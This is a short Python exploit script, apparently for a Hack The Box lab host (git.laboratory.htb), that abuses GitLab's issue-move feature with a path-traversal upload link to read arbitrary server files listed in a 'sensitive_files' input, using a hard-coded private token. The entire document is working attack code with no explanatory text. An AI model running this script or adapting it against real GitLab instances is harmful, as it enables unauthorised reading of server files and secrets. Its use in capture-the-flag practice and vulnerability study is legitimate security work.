import os
import requests
import json
from time import sleep
import gitlab

session = requests.Session()
session.verify = False

host = 'https://git.laboratory.htb'

def exploit(projectName, issueTitle, files, token):

    gl = gitlab.Gitlab(host, private_token=token, session=session)
    gl.auth()
    p1 = gl.projects.create({'name': f"{projectName}-1"})
    p2 = gl.projects.create({'name': f"{projectName}-2"})

    for i, f in enumerate(files):
        stripped_f = f.rstrip('\n')
        issue = p1.issues.create({ \
                'title': f"{issueTitle}-{i}",
                'description': \
                "![a](/uploads/11111111111111111111111111111111/"\
                f"../../../../../../../../../../../../../..{stripped_f})"})
        print(issue.description)
        sleep(3)
        try:
            issue.move(p2.id)
        except Exception as e:
            pass
        sleep(3)

if __name__ == "__main__":
    files = list(open('sensitive_files', 'r'))
    exploit('project-2', 'issue-2', files, "kpUYGeJyoxSjcsSvLGYt")